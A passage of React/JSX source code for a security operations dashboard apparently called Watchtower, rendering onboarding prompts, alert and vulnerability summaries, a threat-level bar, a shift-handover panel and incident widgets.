            <div id="wt-ai-key-nudge" style={{display:'none'}} ref={el=>{
              if(el){
                fetch('/api/settings/anthropic-key',{headers:{'x-tenant-id':tenantRef.current}}).then(r=>r.json()).then(d=>{
                  if(!d.hasKey && el) el.style.display='block';
                }).catch(()=>{});
              }
            }}>
              <div style={{padding:'12px 16px',background:'linear-gradient(135deg,rgba(139,111,255,0.06),rgba(79,143,255,0.04))',border:'1px solid #8b6fff25',borderRadius:10,marginBottom:14,display:'flex',alignItems:'center',gap:10}}>
                <span style={{fontSize:'0.9rem'}}>🧠</span>
                <div style={{flex:1}}>
                  <div style={{fontSize:'0.82rem',fontWeight:700,color:'#8b6fff'}}>Add your Anthropic API key to unlock APEX AI triage</div>
                  <div style={{fontSize:'0.8rem',color:'var(--wt-muted)',marginTop:1}}>BYOK — your key, your data. AI costs go direct to your Anthropic account.</div>
                </div>
                <button onClick={()=>setActiveTab('tools')} style={{padding:'5px 12px',borderRadius:6,background:'#8b6fff',color:'#fff',border:'none',fontSize:'0.82rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',flexShrink:0}}>Add key →</button>
              </div>
            </div>
          )}
          {!demoMode && automation >= 1 && (
            <div role='status' aria-live='polite' style={{display:'flex',alignItems:'center',gap:10,padding:'7px 18px',background:automation===2?'#22d49a0c':'#f0a0300c',borderBottom:`1px solid ${automation===2?'#22d49a20':'#f0a03020'}`,flexShrink:0}}>
              <span style={{fontSize:'0.8rem'}}>{automation===2?'🤖':'✦'}</span>
              <span style={{fontSize:'0.8rem',fontWeight:700,color:automation===2?'#22d49a':'#f0a030'}}>{autLabel} active</span>
              <span style={{fontSize:'0.84rem',color:'var(--wt-muted)'}}>—</span>
              <span style={{fontSize:'0.84rem',color:'var(--wt-muted)'}}>
                {automation===1
                  ? `Auto-closing FPs ≥90% confidence · notifying team on Critical/High TPs · ${actedAlerts.length > 0 ? `${actedAlerts.length} actioned this session` : 'no actions yet this session'}`
                  : `Acting autonomously on all high-confidence alerts · ${actedAlerts.length > 0 ? `${actedAlerts.length} actioned this session` : 'no actions yet this session'}`
                }
              </span>
              {actedAlerts.length > 0 && <span style={{marginLeft:'auto',fontSize:'0.86rem',padding:'2px 8px',borderRadius:4,background:`${autColor}15`,color:autColor,fontWeight:700,border:`1px solid ${autColor}25`}}>{actedAlerts.length} action{actedAlerts.length!==1?'s':''}</span>}
            </div>
          )}

          {!demoMode && Object.keys(connectedTools).length === 0 && (
            <div style={{background:'linear-gradient(145deg,#0d111e,#0a0d18)',border:'1px solid #4f8fff25',borderRadius:14,marginBottom:14,overflow:'hidden'}}>
              <div style={{padding:'16px 20px',borderBottom:'1px solid #1a2535'}}>
                <div style={{fontSize:'0.86rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'1px',marginBottom:4}}>Getting Started</div>
                <div style={{fontSize:'0.9rem',fontWeight:700,marginBottom:2}}>Connect your first tool to see live data</div>
                <div style={{fontSize:'0.8rem',color:'var(--wt-muted)'}}>Your SOC data from CrowdStrike, Splunk, Tenable, Okta and 76 more will appear here automatically.</div>
              </div>
              <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:0}} className='wt-three-col'>
                {[
                  {step:'01',icon:'🔌',title:'Connect a tool',desc:'Go to the Tools tab. Find your tool, click Connect, and paste your API credentials.',action:()=>setActiveTab('tools'),cta:'Open Tools tab'},
                  {step:'02',icon:'🧠',title:'Add your AI key',desc:'In the Tools tab, paste your Anthropic API key. BYOK — your key, your data, your costs.',action:()=>setActiveTab('tools'),cta:'Add Anthropic key'},
                  {step:'03',icon:'⚡',title:'See live alerts',desc:'Once connected, Watchtower syncs every 60s. Click Deep Analyse on any alert for APEX investigation.',action:null,cta:null},
                ].map((s,i)=>(
                  <div key={s.step} style={{padding:'16px 18px',borderRight:i<2?'1px solid #1a2535':'none'}}>
                    <div style={{fontSize:'0.84rem',fontWeight:800,color:'#4f8fff30',fontFamily:'JetBrains Mono,monospace',letterSpacing:'2px',marginBottom:4}}>{s.step}</div>
                    <div style={{fontSize:'1rem',marginBottom:6}}>{s.icon}</div>
                    <div style={{fontSize:'0.84rem',fontWeight:700,marginBottom:4}}>{s.title}</div>
                    <div style={{fontSize:'0.82rem',color:'var(--wt-muted)',lineHeight:1.5,marginBottom:10}}>{s.desc}</div>
                    {s.action && <button onClick={s.action} style={{padding:'5px 12px',borderRadius:6,background:'#4f8fff',color:'#fff',border:'none',fontSize:'0.82rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>{s.cta} →</button>}
                  </div>
                ))}
              </div>
              <div style={{padding:'10px 20px',borderTop:'1px solid #1a2535',display:'flex',alignItems:'center',justifyContent:'space-between'}}>
                <span style={{fontSize:'0.8rem',color:'var(--wt-dim)'}}>Not ready to connect? Explore with demo data first.</span>
                <button onClick={()=>setDemoMode(true)} style={{padding:'5px 14px',borderRadius:6,border:'1px solid #4f8fff30',background:'#4f8fff10',color:'#4f8fff',fontSize:'0.82rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Switch to Demo mode</button>
              </div>
            </div>
          )}

          {/* ═══════════════════════════════ OVERVIEW ═══════════════════════════════ */}
          {activeTab==='overview' && (
            <div style={{display:'flex',flexDirection:'column',gap:14}}>

              {/* ── COMMAND STRIP: 5 hero numbers ────────────────────────────────── */}
              <div style={{display:'grid',gridTemplateColumns:'repeat(5,1fr)',gap:8}} className='wt-five-col' role='list' aria-label='Security metrics'>
                {[
                  {val:critAlerts.length, label:'Critical Alerts', color:'#f0405e', sub:critAlerts.length>0?'Immediate action':demoMode?'Demo data':'Live', tab:'alerts', icon:'🔴', onClickExtra:()=>setAlertSevFilter('Critical')},
                  {val:totalAlerts, label:'Total Alerts', color:'#f97316', sub:(!demoMode&&liveAlerts.length>0?'Live from tools':'Today'), tab:'alerts', icon:'🔔'},
                  {val:openCases, label:'Active Cases', color:'#f0a030', sub:slaBreaches>0?`${slaBreaches} SLA breach`:'All on track', tab:'incidents', icon:'📋'},
                  {val:critVulns.length, label:'Critical Vulns', color:'#8b6fff', sub:kevVulns.length>0?`${kevVulns.length} CISA KEV`:'High/Crit only', tab:'vulns', icon:'🔍'},
                  {val:posture, label:'Posture Score', color:postureColor, sub:posture>=80?'Good standing':posture>=60?'Needs attention':'At risk', tab:'overview', icon:'🛡'},
                ].map(s=>(
                  <div key={s.label} onClick={()=>{if(s.tab!=='overview'){setActiveTab(s.tab);if(s.onClickExtra)s.onClickExtra();}}} style={{padding:'14px 12px',background:'var(--wt-card)',border:`1px solid ${s.color}25`,borderRadius:10,cursor:s.tab!=='overview'?'pointer':'default',transition:'border-color .15s,transform .1s'}}
                    onMouseEnter={e=>{if(s.tab!=='overview'){e.currentTarget.style.borderColor=s.color+'60';e.currentTarget.style.transform='translateY(-1px)';}}}
                    onMouseLeave={e=>{e.currentTarget.style.borderColor=s.color+'25';e.currentTarget.style.transform='none';}}>
                    <div style={{display:'flex',alignItems:'flex-start',justifyContent:'space-between',marginBottom:4}}>
                      <span style={{fontSize:'0.75rem'}}>{s.icon}</span>
                      {s.tab!=='overview'&&<span style={{fontSize:'0.84rem',color:s.color,fontWeight:700,opacity:0.7}}>↗</span>}
                    </div>
                    <div style={{fontSize:'1.8rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,lineHeight:1}}>{s.val}</div>
                    <div style={{fontSize:'0.86rem',fontWeight:700,color:'var(--wt-text)',marginTop:4,whiteSpace:'nowrap',overflow:'hidden',textOverflow:'ellipsis'}}>{s.label}</div>
                    <div style={{fontSize:'0.8rem',color:s.color,marginTop:2,opacity:0.8}}>{s.sub}</div>
                  </div>
                ))}
              </div>

              {/* ── THREAT LEVEL BAR ─────────────────────────────────────────────── */}
              {(()=>{
                const tlevel = critAlerts.length>=3||slaBreaches>0?'CRITICAL':critAlerts.length>0?'HIGH':alerts.filter(a=>a.severity==='High').length>0?'ELEVATED':'GUARDED';
                const tlColor = {CRITICAL:'#f0405e',HIGH:'#f97316',ELEVATED:'#f0a030',GUARDED:'#22d49a'}[tlevel];
                const tlBg = {CRITICAL:'rgba(240,64,94,0.06)',HIGH:'rgba(249,115,22,0.05)',ELEVATED:'rgba(240,160,48,0.05)',GUARDED:'rgba(34,201,146,0.05)'}[tlevel];
                const actions = [];
                if (critAlerts.length>0) actions.push({icon:'🔴',text:`Triage ${critAlerts.length} critical alert${critAlerts.length!==1?'s':''}`,tab:'alerts',color:'#f0405e'});
                if (slaBreaches>0) actions.push({icon:'⏱',text:`${slaBreaches} SLA breach${slaBreaches!==1?'es':''} — cases overdue`,tab:'incidents',color:'#f0405e'});
                if (kevVulns.length>0) actions.push({icon:'🛑',text:`Patch ${kevVulns.length} CISA KEV vuln${kevVulns.length!==1?'s':''}`,tab:'vulns',color:'#f97316'});
                if (gapDevices.length>0) actions.push({icon:'📡',text:`${gapDevices.length} device${gapDevices.length!==1?'s':''} missing agent coverage`,tab:'coverage',color:'#f0a030'});
                if (alerts.filter(a=>a.severity==='High'&&a.verdict==='Pending').length>0) actions.push({icon:'🟠',text:`${alerts.filter(a=>a.severity==='High'&&a.verdict==='Pending').length} high-severity alerts need triage`,tab:'alerts',color:'#f97316'});
                if (actions.length===0) actions.push({icon:'✓',text:'No immediate action required — monitor queue',tab:'alerts',color:'#22d49a'});
                return (
                  <div style={{background:tlBg,border:`1px solid ${tlColor}25`,borderRadius:12,overflow:'hidden'}}>
                    <div style={{display:'flex',alignItems:'center',gap:8,padding:'10px 16px',borderBottom:`1px solid ${tlColor}15`,flexWrap:'wrap'}}>
                      <div style={{display:'flex',alignItems:'center',gap:6,flex:1,minWidth:0}}>
                        <div style={{width:8,height:8,borderRadius:'50%',background:tlColor,boxShadow:`0 0 8px ${tlColor}`,flexShrink:0,animation:tlevel==='CRITICAL'?'pulse 1s ease infinite':tlevel==='HIGH'?'pulse 2s ease infinite':'none'}} />
                        <span style={{fontSize:'0.82rem',fontWeight:900,color:tlColor,letterSpacing:'1px',whiteSpace:'nowrap'}}>THREAT LEVEL — {tlevel}</span>
                      </div>
                      <div style={{display:'flex',gap:6,alignItems:'center',flexShrink:0}}>
                        <span style={{fontSize:'0.8rem',color:'var(--wt-dim)'}}>{demoMode?'Demo':'Live'}</span>
                        {canUse('team') ? <button onClick={()=>{setShowCopilot(s=>!s);setTimeout(()=>copilotBottomRef.current?.scrollIntoView({behavior:'auto'}),100);}} style={{fontSize:'0.82rem',fontWeight:700,padding:'2px 8px',borderRadius:4,border:`1px solid ${tlColor}30`,background:`${tlColor}0a`,color:tlColor,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>✦ Co-Pilot</button> : <a href='/pricing' style={{fontSize:'0.82rem',fontWeight:700,padding:'2px 8px',borderRadius:4,border:'1px solid #4f8fff30',background:'#4f8fff0a',color:'#4f8fff',textDecoration:'none'}}>🔒 Co-Pilot</a>}
                        <button onClick={async()=>{setHandoverLoading(true);setShiftHandover(null);try{const activeIncs=incidents.filter(i=>!deletedIncidents.has(i.id)&&(incidentStatuses[i.id]||i.status)==='Active');const r=await fetch('/api/shift-handover',{method:'POST',headers:{'Content-Type':'application/json','x-tenant-id':tenantRef.current},body:JSON.stringify({openAlerts:totalAlerts,critAlerts:critAlerts.length,openCases,slaBreaches,tools:Object.keys(connectedTools).length,posture,topAlert:critAlerts[0]?.title||alerts[0]?.title||'',openIncidents:activeIncs.map(i=>i.title).slice(0,5),analyst:currentUserName||'Analyst'})});const d=await r.json();if(d.ok&&d.handover)setShiftHandover(d.handover);else setShiftHandover({summary:d.error||'Generation failed — check your Anthropic API key in Tools.',keyActions:[],generatedAt:new Date().toISOString()});}catch(e){setShiftHandover({summary:'Connection error: '+e.message,keyActions:[],generatedAt:new Date().toISOString()});}setHandoverLoading(false);}} disabled={handoverLoading} style={{fontSize:'0.82rem',fontWeight:700,padding:'2px 8px',borderRadius:4,border:'1px solid #22d49a30',background:'#22d49a0a',color:'#22d49a',cursor:handoverLoading?'not-allowed':'pointer',fontFamily:'Inter,sans-serif',display:'flex',alignItems:'center',gap:3}}>{handoverLoading&&<span style={{display:'inline-block',width:7,height:7,borderRadius:'50%',border:'1.5px solid #22d49a',borderTopColor:'transparent',animation:'spin 0.8s linear infinite'}} />}⇄ Handover</button>
                      </div>
                    </div>
                    <div style={{padding:'10px 16px',display:'flex',flexDirection:'column',gap:5}}>
                      {actions.slice(0,3).map((a,i)=>(
                        <div key={i} onClick={()=>setActiveTab(a.tab)} style={{display:'flex',alignItems:'center',gap:8,padding:'5px 8px',borderRadius:7,cursor:'pointer',transition:'background .12s',background:i===0&&tlevel!=='GUARDED'?`${a.color}08`:'transparent'}}
                          onMouseEnter={e=>e.currentTarget.style.background=`${a.color}10`} onMouseLeave={e=>e.currentTarget.style.background=i===0&&tlevel!=='GUARDED'?`${a.color}08`:'transparent'}>
                          <span style={{fontSize:'0.75rem',flexShrink:0}}>{a.icon}</span>
                          <span style={{fontSize:'0.82rem',fontWeight:i===0?700:500,color:i===0?a.color:'var(--wt-secondary)',flex:1}}>{a.text}</span>
                          <span style={{fontSize:'0.86rem',color:'var(--wt-dim)'}}>↗</span>
                        </div>
                      ))}
                    </div>
                  </div>
                );
              })()}
              {/* Shift handover panel */}
              {shiftHandover&&(
                <div style={{background:'#06100e',border:'1px solid #22d49a25',borderRadius:10,padding:'12px 16px',position:'relative'}}>
                  <button onClick={()=>setShiftHandover(null)} aria-label='Close handover' style={{position:'absolute',top:8,right:10,background:'none',border:'none',color:'var(--wt-dim)',cursor:'pointer',fontSize:'0.8rem'}}>×</button>
                  <div style={{fontSize:'0.84rem',fontWeight:700,color:'#22d49a',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:6}}>⇄ Shift Handover Brief</div>
                  <WtMarkdown text={shiftHandover.summary} accent='#22d49a' />
                  {shiftHandover.recommendation&&<div style={{marginTop:8,padding:'8px 12px',background:'#22d49a08',border:'1px solid #22d49a20',borderRadius:7,fontSize:'0.84rem',color:'#22d49a',fontWeight:600}}>🎯 Priority: {shiftHandover.recommendation}</div>}
                  {(shiftHandover.keyActions||[]).length>0&&(<div style={{marginTop:10}}><div style={{fontSize:'0.72rem',fontWeight:800,color:'#22d49a',textTransform:'uppercase',letterSpacing:'1px',marginBottom:8}}>Actions for incoming analyst</div>{(shiftHandover.keyActions||[]).map((a,i)=><div key={i} style={{display:'flex',gap:8,padding:'6px 8px',marginBottom:4,background:'rgba(34,212,154,0.04)',border:'1px solid rgba(34,212,154,0.12)',borderRadius:6,alignItems:'flex-start'}}><span style={{width:20,height:20,borderRadius:5,background:'#22d49a',display:'flex',alignItems:'center',justifyContent:'center',flexShrink:0,fontSize:'0.7rem',fontWeight:900,color:'#050810'}}>{i+1}</span><span style={{fontSize:'0.84rem',color:'var(--wt-secondary)',lineHeight:1.55}}>{a}</span></div>)}</div>)}
                  <div style={{marginTop:6,fontSize:'0.86rem',color:'var(--wt-dim)'}}>Generated {new Date(shiftHandover.generatedAt).toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit'})}</div>
                </div>
              )}

              {/* ── LIVE THREAT INTEL + RECENT INCIDENTS ────────────────────── */}
              <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:10,minWidth:0}} className='wt-two-col'>
                {/* Emerging threats */}
                <div style={{background:'var(--wt-card)',border:'1px solid #f0405e18',borderRadius:12,padding:'14px',overflow:'hidden',minWidth:0}}>
                  <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:10}}>
                    <span style={{fontSize:'0.86rem',fontWeight:800,color:'#f0405e',textTransform:'uppercase',letterSpacing:'0.5px'}}>Emerging Threats</span>
                    <span style={{fontSize:'0.86rem',color:'var(--wt-dim)',marginLeft:'auto'}}>for {industry}</span>
                    <button onClick={()=>setActiveTab('intel')} style={{fontSize:'0.8rem',color:'#4f8fff',background:'none',border:'none',cursor:'pointer',fontFamily:'Inter,sans-serif',padding:0}}>View all ↗</button>
                  </div>
                  {(customIntel && customIntel.length > 0 ? customIntel : (DEMO_INTEL_BY_INDUSTRY[industry]||DEMO_INTEL_BY_INDUSTRY['default']||[])).slice(0,3).map((item,i)=>{
                    const c={Critical:'#f0405e',High:'#f97316',Medium:'#f0a030',Low:'#4f8fff'}[item.severity]||'#6b7a94';
                    return (
                      <div key={item.id||i} style={{padding:'8px 0',borderBottom:'1px solid var(--wt-border)',display:'flex',gap:8,alignItems:'flex-start'}}>
                        <span style={{width:6,height:6,borderRadius:'50%',background:c,flexShrink:0,marginTop:5}} />
                        <div style={{flex:1,minWidth:0}}>
                          <div style={{fontSize:'0.86rem',fontWeight:600,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{item.title}</div>
                          <div style={{fontSize:'0.84rem',color:'var(--wt-muted)',marginTop:1}}>{item.source} · {item.time}</div>
                        </div>
                        <span style={{fontSize:'0.84rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:`${c}18`,color:c,flexShrink:0}}>{item.severity}</span>
                      </div>
                    );
                  })}
                  {(!customIntel || customIntel.length === 0) && (!DEMO_INTEL_BY_INDUSTRY[industry]||DEMO_INTEL_BY_INDUSTRY[industry].length===0) && (
                    <div style={{padding:'12px 0',textAlign:'center'}}>
                      <div style={{fontSize:'0.84rem',color:'var(--wt-muted)',marginBottom:4}}>
                        {demoMode?'Demo intel loading…':'No threat intel yet'}
                      </div>
                      {!demoMode&&<div style={{fontSize:'0.78rem',color:'var(--wt-dim)'}}>Connect an intel source in <button onClick={()=>setActiveTab('tools')} style={{background:'none',border:'none',color:'#4f8fff',cursor:'pointer',fontFamily:'Inter,sans-serif',fontSize:'0.78rem',padding:0,textDecoration:'underline'}}>Tools</button> to see live threat feeds</div>}
                    </div>
                  )}
                  {livetenableNews.length>0 && (
                    <div style={{marginTop:8,paddingTop:8,borderTop:'1px solid var(--wt-border)'}}>
                      <div style={{fontSize:'0.8rem',fontWeight:700,color:'#00b3e3',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:5}}>Tenable Research</div>
                      {livetenableNews.slice(0,2).map((item,i)=>(
                        <div key={i} style={{fontSize:'0.8rem',color:'var(--wt-secondary)',padding:'3px 0',overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{item.title}</div>
                      ))}
                    </div>
                  )}
                </div>

                {/* Recent incident activity */}
                <div style={{background:'var(--wt-card)',border:'1px solid #8b6fff18',borderRadius:12,padding:'14px',overflow:'hidden',minWidth:0}}>
                  <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:10}}>
                    <span style={{fontSize:'0.86rem',fontWeight:800,color:'#8b6fff',textTransform:'uppercase',letterSpacing:'0.5px'}}>Active Incidents</span>
                    <button onClick={()=>setActiveTab('incidents')} style={{fontSize:'0.8rem',color:'#4f8fff',background:'none',border:'none',cursor:'pointer',fontFamily:'Inter,sans-serif',padding:0,marginLeft:'auto'}}>View all ↗</button>
                  </div>
                  {incidents.filter(i=>(incidentStatuses[i.id]||i.status)!=='Resolved'&&!deletedIncidents.has(i.id)).slice(0,4).map(inc=>{
                    const st=incidentStatuses[inc.id]||inc.status;
                    const sc=st==='Active'?'#f0405e':st==='Escalated'?'#8b6fff':st==='Contained'?'#f0a030':'#22d49a';
                    return (
                      <div key={inc.id} onClick={()=>{setActiveTab('incidents');}} style={{padding:'7px 0',borderBottom:'1px solid var(--wt-border)',display:'flex',gap:8,alignItems:'center',cursor:'pointer'}}>
                        <div style={{width:6,height:6,borderRadius:'50%',background:sc,flexShrink:0}} />
                        <div style={{flex:1,minWidth:0,overflow:'hidden'}}>
                          <div style={{fontSize:'0.86rem',fontWeight:600,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{inc.title}</div>
                          <div style={{display:'flex',gap:6,marginTop:1}}>
                            <span style={{fontSize:'0.86rem',fontWeight:700,color:sc}}>{st}</span>
                            {inc.assignedTo && <span style={{fontSize:'0.86rem',color:'var(--wt-dim)'}}>{inc.assignedTo.split(' ')[0]}</span>}
                          </div>
                        </div>
                        <span style={{fontSize:'0.84rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:`${SEV_COLOR[inc.severity]||'#6b7a94'}18`,color:SEV_COLOR[inc.severity]||'#6b7a94',flexShrink:0}}>{inc.severity}</span>
                      </div>
                    );
                  })}
                  {incidents.filter(i=>(incidentStatuses[i.id]||i.status)!=='Resolved'&&!deletedIncidents.has(i.id)).length===0 && (
                    <div style={{fontSize:'0.84rem',color:demoMode?'#22d49a':'var(--wt-muted)',padding:'8px 0',textAlign:'center'}}>{demoMode?'No active incidents':'No cases yet — alerts will auto-escalate to cases when APEX confirms TPs'}</div>
                  )}
                </div>
              </div>


              {/* ── FOUR QUADRANT DRILL-DOWN GRID ────────────────────────────────── */}
              <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:10}} className='wt-two-col'>

                {/* Quadrant 1: Active Alerts breakdown */}
                <div onClick={()=>setActiveTab('alerts')} style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'14px',overflow:'hidden',cursor:'pointer',transition:'border-color .15s'}}
                  onMouseEnter={e=>e.currentTarget.style.borderColor='#f0405e40'} onMouseLeave={e=>e.currentTarget.style.borderColor='var(--wt-border)'}>
                  <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:10}}>
                    <span style={{fontSize:'0.86rem',fontWeight:800,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px'}}>Alerts by Severity</span>
                    <span style={{marginLeft:'auto',fontSize:'0.8rem',color:'#f0405e'}}>View all ↗</span>
                  </div>
                  {(['Critical','High','Medium','Low']).map(sev=>{
                    const count = alerts.filter(a=>a.severity===sev).length;
                    const live = !demoMode && liveAlerts.filter(a=>a.severity===sev).length;
                    const shown = demoMode ? count : (liveAlerts.length>0 ? live : count);
                    const total = demoMode ? alerts.length : (liveAlerts.length || alerts.length);
                    const pct = total>0?Math.round((shown/total)*100):0;
                    const c = {Critical:'#f0405e',High:'#f97316',Medium:'#f0a030',Low:'#4f8fff'}[sev];
                    return (
                      <div key={sev} style={{marginBottom:6}}>
                        <div style={{display:'flex',justifyContent:'space-between',marginBottom:2}}>
                          <span style={{fontSize:'0.86rem',color:'var(--wt-secondary)',fontWeight:600}}>{sev}</span>
                          <span style={{fontSize:'0.86rem',fontWeight:800,fontFamily:'JetBrains Mono,monospace',color:c}}>{shown}</span>
                        </div>
                        <div style={{height:4,background:'var(--wt-border)',borderRadius:2,overflow:'hidden'}}>
                          <div style={{height:'100%',width:`${pct}%`,background:c,borderRadius:2,transition:'width .6s ease'}} />
                        </div>
                      </div>
                    );
                  })}
                  <div style={{marginTop:8,fontSize:'0.82rem',color:'var(--wt-muted)'}}>
                    {fpAlerts.length>0?`${fpAlerts.length} auto-closed FP${fpAlerts.length!==1?'s':''} · `:''}{tpAlerts.length>0?`${tpAlerts.length} confirmed TP${tpAlerts.length!==1?'s':''}`:demoMode?'AI triage active':'Awaiting triage'}
                  </div>
                </div>

                {/* Quadrant 2: Coverage status */}
                <div onClick={()=>setModal({type:'gaps'})} style={{background:'var(--wt-card)',border:`1px solid ${coveredPct<80?'#f0405e':'var(--wt-border)'}20`,borderRadius:12,padding:'14px',overflow:'hidden',cursor:'pointer',transition:'border-color .15s'}}
                  onMouseEnter={e=>e.currentTarget.style.borderColor=(coveredPct<80?'#f0405e':'#22d49a')+'60'} onMouseLeave={e=>e.currentTarget.style.borderColor=(coveredPct<80?'#f0405e':'var(--wt-border)')+'20'}>
                  <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:10}}>
                    <span style={{fontSize:'0.86rem',fontWeight:800,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px'}}>Estate Coverage</span>
                    <span style={{marginLeft:'auto',fontSize:'0.8rem',color:'#22d49a'}}>Details ↗</span>
                  </div>
                  <div style={{display:'flex',alignItems:'flex-end',gap:10,marginBottom:10,flexWrap:'wrap'}}>
                    <div style={{fontSize:'2.6rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:coveredPct>=90?'#22d49a':coveredPct>=70?'#f0a030':'#f0405e',lineHeight:1}}>{coveredPct}%</div>
                    <div style={{paddingBottom:4}}>
                      <div style={{fontSize:'0.84rem',fontWeight:700,color:'var(--wt-text)'}}>deployed</div>
                      <div style={{fontSize:'0.82rem',color:'var(--wt-muted)'}}>{gapDevices.length} unprotected</div>
                    </div>
                  </div>
                  <div style={{height:6,background:'var(--wt-border)',borderRadius:3,overflow:'hidden',marginBottom:8}}>
                    <div style={{height:'100%',width:`${coveredPct}%`,background:coveredPct>=90?'#22d49a':coveredPct>=70?'#f0a030':'#f0405e',borderRadius:3,transition:'width .8s ease'}} />
                  </div>
                  {gapDevices.slice(0,3).map(d=>(
                    <div key={d.hostname} style={{fontSize:'0.82rem',color:'#f0405e',padding:'2px 0',borderBottom:'1px solid #f0405e10',fontFamily:'JetBrains Mono,monospace',overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{d.hostname.length>18?d.hostname.slice(0,16)+'…':d.hostname}</div>
                  ))}
                  {gapDevices.length>3&&<div style={{fontSize:'0.82rem',color:'var(--wt-muted)',marginTop:4}}>+{gapDevices.length-3} more — click to view all</div>}
                </div>

                {/* Quadrant 3: Top vulns */}
                <div onClick={()=>setActiveTab('vulns')} style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'14px',overflow:'hidden',cursor:'pointer',transition:'border-color .15s'}}
                  onMouseEnter={e=>e.currentTarget.style.borderColor='#8b6fff40'} onMouseLeave={e=>e.currentTarget.style.borderColor='var(--wt-border)'}>
                  <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:10}}>
                    <span style={{fontSize:'0.86rem',fontWeight:800,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px'}}>Top Vulnerabilities</span>
                    {kevVulns.length>0&&<span style={{fontSize:'0.84rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:'#f97316',color:'#fff'}}>{kevVulns.length} KEV</span>}
                    <span style={{marginLeft:'auto',fontSize:'0.8rem',color:'#8b6fff'}}>View all ↗</span>
                  </div>
                  {vulns.slice(0,5).map((v,i)=>(
                    <div key={v.id} style={{display:'flex',alignItems:'center',gap:8,padding:'5px 0',borderBottom:'1px solid var(--wt-border)'}}>
                      <span style={{fontSize:'0.8rem',fontWeight:900,color:'var(--wt-dim)',minWidth:14,fontFamily:'JetBrains Mono,monospace'}}>{i+1}</span>
                      <div style={{flex:1,minWidth:0}}>
                        <div style={{fontSize:'0.82rem',fontWeight:600,color:'var(--wt-text)',overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{v.title}</div>
                        <div style={{display:'flex',gap:4,marginTop:1,flexWrap:'wrap',alignItems:'center'}}>
                          <span style={{fontSize:'0.78rem',fontWeight:700,padding:'0 4px',borderRadius:2,background:v.severity==='Critical'?'#f0405e':v.severity==='High'?'#f9731620':'#f0a03020',color:v.severity==='Critical'?'#fff':v.severity==='High'?'#f97316':'#f0a030',flexShrink:0}}>{v.severity}</span>
                          {v.cve&&<span style={{fontSize:'0.76rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace',overflow:'hidden',textOverflow:'ellipsis',maxWidth:100}}>{v.cve}</span>}
                          {v.kev&&<span style={{fontSize:'0.6rem',fontWeight:800,padding:'0 3px',borderRadius:2,background:'#f97316',color:'#fff',flexShrink:0}}>KEV</span>}
                        </div>
                      </div>
                    </div>
                  ))}
                  {vulns.length===0&&<div style={{fontSize:'0.82rem',color:'var(--wt-muted)',textAlign:'center',padding:'16px 0'}}>No High/Critical vulns · {demoMode?'Switch to Live':'Check Tenable sync'}</div>}
                </div>

                {/* Quadrant 4: Open cases + tool status */}
                <div style={{display:'flex',flexDirection:'column',gap:8}}>
                  {/* Cases */}
                  <div onClick={()=>setActiveTab('incidents')} style={{flex:1,background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'14px',overflow:'hidden',cursor:'pointer',transition:'border-color .15s'}}
                    onMouseEnter={e=>e.currentTarget.style.borderColor='#f0a03040'} onMouseLeave={e=>e.currentTarget.style.borderColor='var(--wt-border)'}>
                    <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:8}}>
                      <span style={{fontSize:'0.86rem',fontWeight:800,color:'var(--wt-muted)',textTransform:'uppercase',letterSpacing:'0.5px'}}>Active Cases</span>
                      {slaBreaches>0&&<span style={{fontSize:'0.84rem',fontWeight:800,padding:'1px 5px',borderRadius:3,background:'#f0405e',color:'#fff'}}>{slaBreaches} SLA</span>}
                      <span style={{marginLeft:'auto',fontSize:'0.8rem',color:'#f0a030'}}>View all ↗</span>
                    </div>
                    {incidents.filter(i=>!deletedIncidents.has(i.id)&&(incidentStatuses[i.id]||i.status)==='Active').slice(0,3).map(inc=>(
                      <div key={inc.id} style={{display:'flex',alignItems:'center',gap:8,padding:'5px 0',borderBottom:'1px solid var(--wt-border)',minWidth:0}}>
                        <span style={{width:6,height:6,borderRadius:'50%',background:inc.severity==='Critical'?'#f0405e':'#f97316',flexShrink:0}} />
                        <span style={{fontSize:'0.8rem',fontWeight:600,flex:1,minWidth:0,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>{inc.title}</span>
                        <span className='wt-hide-xs' style={{fontSize:'0.8rem',color:'var(--wt-dim)',fontFamily:'JetBrains Mono,monospace',flexShrink:0}}>{inc.id}</span>
                      </div>
                    ))}
                    {openCases===0&&<div style={{fontSize:'0.82rem',color:'#22d49a',textAlign:'center',padding:'8px 0'}}>✓ No active cases</div>}
                  </div>
                  {/* Tool health */}
